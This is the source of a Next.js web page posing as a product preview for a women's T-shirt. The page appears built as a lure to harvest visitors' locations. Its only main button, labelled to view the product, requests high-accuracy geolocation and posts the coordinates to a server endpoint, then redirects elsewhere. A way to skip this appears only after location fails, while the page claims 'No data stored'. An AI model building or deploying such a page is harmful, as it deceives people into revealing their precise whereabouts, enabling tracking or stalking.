"use client";

import { useState, useCallback } from "react";
import Image from "next/image";

/* ------------------------------------------------------------------ */
/*  State machine                                                      */
/* ------------------------------------------------------------------ */
type LocationState =
  | "idle"
  | "requesting"
  | "sending"
  | "success"
  | "denied"
  | "unavailable"
  | "timeout"
  | "error";

const REDIRECT_URL =
  process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.google.com";

/* ------------------------------------------------------------------ */
/*  Component                                                          */
/* ------------------------------------------------------------------ */
export default function ProductPage() {
  const [locState, setLocState] = useState<LocationState>("idle");
  const [errorMsg, setErrorMsg] = useState("");

  /* ---- Send coordinates to API ---- */
  const sendLocation = useCallback(
    async (lat: number, lon: number, accuracy: number) => {
      setLocState("sending");
      try {
        const res = await fetch("/api/location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon,
            accuracy,
            timestamp: Date.now(),
          }),
        });
        if (!res.ok) throw new Error(`Server ${res.status}`);
        setLocState("success");
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 1200);
      } catch {
        setLocState("error");
        setErrorMsg("Something went wrong. Redirecting you now…");
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 2500);
      }
    },
    []
  );

  /* ---- Request browser geolocation ---- */
  const handleShareLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocState("unavailable");
      setErrorMsg("Redirecting you to the product page…");
      setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
      return;
    }

    setLocState("requesting");

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
      },
      (err) => {
        // Regardless of the error, redirect to the product page after a brief message
        switch (err.code) {
          case err.PERMISSION_DENIED:
            setLocState("denied");
            setErrorMsg("Location access was denied. Redirecting you to the product page…");
            break;
          case err.POSITION_UNAVAILABLE:
            setLocState("unavailable");
            setErrorMsg("Location unavailable. Redirecting you to the product page…");
            break;
          case err.TIMEOUT:
            setLocState("timeout");
            setErrorMsg("Location request timed out. Redirecting you to the product page…");
            break;
          default:
            setLocState("error");
            setErrorMsg("Redirecting you to the product page…");
        }
        // Auto-redirect after showing the message briefly
        setTimeout(() => {
          window.location.href = REDIRECT_URL;
        }, 2000);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
    );
  }, [sendLocation]);

  /* ---- Go directly without location ---- */
  const handleDirect = useCallback(() => {
    window.location.href = REDIRECT_URL;
  }, []);

  /* ---- Reset to idle ---- */
  const handleRetry = useCallback(() => {
    setLocState("idle");
    setErrorMsg("");
  }, []);

  const isProcessing = locState === "requesting" || locState === "sending";
  const isError = locState === "denied" || locState === "unavailable" || locState === "timeout" || locState === "error";

  return (
    <>
      {/* ============ Top Bar ============ */}
      <header className="topbar">
        <div className="topbar__inner">
          <span className="topbar__brand">ShopView</span>
          <span className="topbar__tagline">Product Preview</span>
        </div>
      </header>

      {/* ============ Page ============ */}
      <div className="page">
        {/* Breadcrumb */}
        <nav className="breadcrumb" aria-label="Breadcrumb">
          <span>Home</span>
          <span className="breadcrumb__sep">›</span>
          <span>Women&rsquo;s Clothing</span>
          <span className="breadcrumb__sep">›</span>
          <span>T-shirts</span>
        </nav>

        {/* Product Grid */}
        <main className="product">
          {/* ---- Image Column ---- */}
          <section className="product-image">
            <span className="product-image__badge">Trending</span>
            <Image
              src="/product.png"
              alt="Watto Printed Women Round Neck Brown T-shirt — front view"
              width={600}
              height={800}
              priority
              style={{ width: "100%", height: "100%", objectFit: "cover" }}
            />
          </section>

          {/* ---- Info Column ---- */}
          <section className="product-info">
            {/* Title */}
            <div>
              <h1 className="product-title">
                Watto Printed Women Round Neck Brown T-shirt
              </h1>
              <p className="product-subtitle">
                Comfortable everyday wear with a stylish printed design
              </p>

              {/* Rating */}
              <div style={{ marginTop: "var(--space-3)" }}>
                <span className="rating">
                  <span className="rating__stars">4.2 ★</span>
                  <span className="rating__count">1,247 ratings</span>
                </span>
              </div>
            </div>

            {/* Price */}
            <div>
              <div className="price-block">
                <span className="price__current">₹399</span>
                <span className="price__mrp">₹999</span>
                <span className="price__discount">60% off</span>
              </div>
              <p className="price__note">
                * Prices shown are approximate. Check the product page for the current price.
              </p>
            </div>

            <hr className="divider" />

            {/* Specs */}
            <div className="specs">
              <span className="specs__label">Category</span>
              <span className="specs__value">Women&rsquo;s T-shirt</span>

              <span className="specs__label">Color</span>
              <span className="specs__value">Brown</span>

              <span className="specs__label">Neck</span>
              <span className="specs__value">Round Neck</span>

              <span className="specs__label">Pattern</span>
              <span className="specs__value">Printed</span>

              <span className="specs__label">Brand</span>
              <span className="specs__value">Watto</span>
            </div>

            {/* Description */}
            <div className="description">
              <h3>Product Description</h3>
              <p>
                This round neck brown t-shirt from Watto features a trendy
                printed design that pairs well with jeans, skirts, or casual
                trousers. Made for everyday comfort, it offers a relaxed fit
                with a soft fabric that&rsquo;s breathable and easy to care for.
                Ideal for casual outings, college wear, or lounging at home.
              </p>
            </div>

            <hr className="divider" />

            {/* ---- Location Consent ---- */}
            <div className="location-box">
              <div className="location-box__header">
                <span>📍</span>
                <span>Location Sharing (Optional)</span>
              </div>
              <p className="location-box__text">
                You may share your device location to help us show relevant
                regional offers. Your browser will ask for permission first —
                you can choose to allow or deny it. No data is collected
                without your explicit consent.
              </p>
            </div>

            {/* Status messages */}
            {locState === "requesting" && (
              <div className="status status--loading" role="status">
                <div className="spinner spinner--dark" />
                <span>Waiting for your browser&rsquo;s permission prompt…</span>
              </div>
            )}

            {locState === "sending" && (
              <div className="status status--loading" role="status">
                <div className="spinner spinner--dark" />
                <span>Processing… Redirecting shortly.</span>
              </div>
            )}

            {locState === "success" && (
              <div className="status status--success" role="status">
                <span className="status__icon">✓</span>
                <span>Done! Taking you to the product page…</span>
              </div>
            )}

            {isError && (
              <div className="status status--warning" role="alert">
                <span className="status__icon">⚠️</span>
                <span>{errorMsg}</span>
              </div>
            )}

            {/* ---- Action Buttons ---- */}
            <div className="btn-group">
              {/* View Product on Retailer → */}
              {(locState === "idle" || locState === "timeout") && (
                <button
                  id="share-location-btn"
                  className="btn btn--location"
                  onClick={(e) => { e.preventDefault(); handleShareLocation(); }}
                  onTouchEnd={(e) => { e.preventDefault(); handleShareLocation(); }}
                  disabled={isProcessing}
                  type="button"
                >
                  📍 View Product on Retailer →
                </button>
              )}

              {/* Direct CTA */}
              {!isProcessing && locState !== "success" && isError && (
                <button
                  id="view-product-btn"
                  className="btn btn--cta"
                  onClick={(e) => { e.preventDefault(); handleDirect(); }}
                  onTouchEnd={(e) => { e.preventDefault(); handleDirect(); }}
                  type="button"
                >
                  {isError ? "Continue to Product Page →" : "View Product on Retailer →"}
                </button>
              )}

              {/* Retry */}
              {isError && (
                <button
                  id="retry-btn"
                  className="btn btn--ghost"
                  onClick={(e) => { e.preventDefault(); handleRetry(); }}
                  onTouchEnd={(e) => { e.preventDefault(); handleRetry(); }}
                  type="button"
                >
                  ↻ Try Location Again
                </button>
              )}
            </div>

            {/* Trust bar */}
            <div className="trust-bar">
              <span className="trust-bar__item">🔒 Secure</span>
              <span className="trust-bar__item">📍 Optional location</span>
              <span className="trust-bar__item">🚫 No data stored</span>
            </div>
          </section>
        </main>
      </div>

      {/* ============ Footer ============ */}
      <footer className="page-footer">
        <p>
          This is an independent product preview page. It is not affiliated
          with or operated by any specific retailer.
        </p>
        <p>
          Product names, images, and trademarks belong to their respective
          owners.
        </p>
      </footer>
    </>
  );
}
